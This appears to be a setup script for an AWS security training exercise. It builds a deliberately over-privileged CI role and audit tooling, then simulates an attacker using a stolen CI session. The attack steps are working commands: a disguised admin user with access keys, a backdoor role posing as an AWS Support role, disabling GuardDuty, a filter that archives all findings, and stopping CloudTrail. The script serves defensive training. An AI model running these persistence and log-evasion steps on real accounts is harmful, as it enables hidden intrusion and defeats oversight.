#!/usr/bin/env bash
# BOSS — "The Kraken's Last Stand" — environment + attack simulation.
# Run in the skyfortress-dev MEMBER account (SCPs don't apply to the management account!):
#   AWS_PROFILE=sky-dev ./setup.sh
set -euo pipefail
REGION="${AWS_REGION:-us-east-1}"
ACCT=$(aws sts get-caller-identity --query Account --output text)
ME=$(aws sts get-caller-identity --query Arn --output text)
CI_ROLE=nimbus-ci-deployer
TRAIL=nimbus-dev-audit
BUCKET="skyfortress-d5-boss-trail-${ACCT}"
mkdir -p "${HOME}/.kraken"
echo "[*] Boss arena: account ${ACCT} as ${ME}"

# --- the over-privileged CI role (sadly realistic) ---------------------------
cat > /tmp/ci-trust.json <<JSON
{ "Version": "2012-10-17",
  "Statement": [{ "Effect": "Allow", "Principal": { "AWS": "arn:aws:iam::${ACCT}:root" }, "Action": "sts:AssumeRole" }] }
JSON
aws iam create-role --role-name $CI_ROLE --assume-role-policy-document file:///tmp/ci-trust.json \
  --description "GitHub Actions deployer (TODO: switch to OIDC + least privilege)" \
  --tags Key=lab,Value=skyfortress-d5-boss >/dev/null
aws iam attach-role-policy --role-name $CI_ROLE --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# --- an audit trail for the Kraken to silence --------------------------------
aws s3api create-bucket --bucket "$BUCKET" >/dev/null
cat > /tmp/trail-bucket.json <<JSON
{ "Version": "2012-10-17",
  "Statement": [
    { "Sid": "AclCheck", "Effect": "Allow", "Principal": { "Service": "cloudtrail.amazonaws.com" },
      "Action": "s3:GetBucketAcl", "Resource": "arn:aws:s3:::${BUCKET}" },
    { "Sid": "Write", "Effect": "Allow", "Principal": { "Service": "cloudtrail.amazonaws.com" },
      "Action": "s3:PutObject", "Resource": "arn:aws:s3:::${BUCKET}/AWSLogs/${ACCT}/*",
      "Condition": { "StringEquals": { "s3:x-amz-acl": "bucket-owner-full-control" } } } ] }
JSON
aws s3api put-bucket-policy --bucket "$BUCKET" --policy file:///tmp/trail-bucket.json
aws cloudtrail create-trail --name $TRAIL --s3-bucket-name "$BUCKET" >/dev/null
aws cloudtrail start-logging --name $TRAIL

# --- make sure GuardDuty is on -----------------------------------------------
DET=$(aws guardduty list-detectors --query 'DetectorIds[0]' --output text)
if [ "$DET" = "None" ] || [ -z "$DET" ]; then
  DET=$(aws guardduty create-detector --enable --query DetectorId --output text)
  echo "[*] Enabled GuardDuty detector $DET (30-day free trial applies)"
fi

echo "[*] Waiting for IAM propagation…"; sleep 12

# =============================================================================
#  THE KRAKEN STRIKES — using a stolen CI session
# =============================================================================
aws sts assume-role --role-arn "arn:aws:iam::${ACCT}:role/${CI_ROLE}" \
  --role-session-name "gha-run-48151623" > "${HOME}/.kraken/ci-session.json"
(
  export AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId ~/.kraken/ci-session.json)
  export AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretAccessKey ~/.kraken/ci-session.json)
  export AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken ~/.kraken/ci-session.json)
  unset AWS_PROFILE; export AWS_DEFAULT_REGION=$REGION

  echo "🐙 1/5 creating a quiet little admin user…"
  aws iam create-user --user-name svc-telemetry --tags Key=owner,Value=observability >/dev/null
  aws iam attach-user-policy --user-name svc-telemetry --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
  aws iam create-access-key --user-name svc-telemetry > ~/.kraken/boss-user.json
  sleep 8

  echo "🐙 2/5 …and a role that looks like it belongs to AWS…"
  cat > /tmp/bd-trust.json <<JSON
{ "Version": "2012-10-17",
  "Statement": [{ "Effect": "Allow", "Principal": { "AWS": "arn:aws:iam::${ACCT}:user/svc-telemetry" }, "Action": "sts:AssumeRole" }] }
JSON
  aws iam create-role --role-name AWSSupportDiagnostics-Helper --assume-role-policy-document file:///tmp/bd-trust.json \
    --description "Used by AWS Support for diagnostics" >/dev/null
  aws iam attach-role-policy --role-name AWSSupportDiagnostics-Helper --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

  echo "🐙 3/5 blinding the watchtower (GuardDuty)…"
  if aws guardduty update-detector --detector-id "$DET" --no-enable 2>/dev/null; then
    echo "      detector DISABLED 😈"
  else
    echo "      ⛔ couldn't disable the detector — someone set up delegated admin / org policy. Annoying."
  fi
  echo "🐙 4/5 …and auto-archiving every future finding, just in case"
  aws guardduty create-filter --detector-id "$DET" --name noise-reduction-ec2 --action ARCHIVE --rank 1 \
    --description "Suppress noisy low-value findings (approved by SecOps)" \
    --finding-criteria '{"Criterion":{"severity":{"Gte":1}}}' >/dev/null 2>&1 \
    && echo "      suppression rule planted" || echo "      ⛔ filter creation blocked"

  echo "🐙 5/5 turning off the audit trail…"
  aws cloudtrail stop-logging --name $TRAIL && echo "      trail '$TRAIL' stopped"
)
echo
echo "🐙 The Kraken has left the building. Your CI session (gha-run-48151623) is still 'valid'."
echo "[>] Begin the boss fight. When you think you've won: python3 verify.py --profile sky-dev"
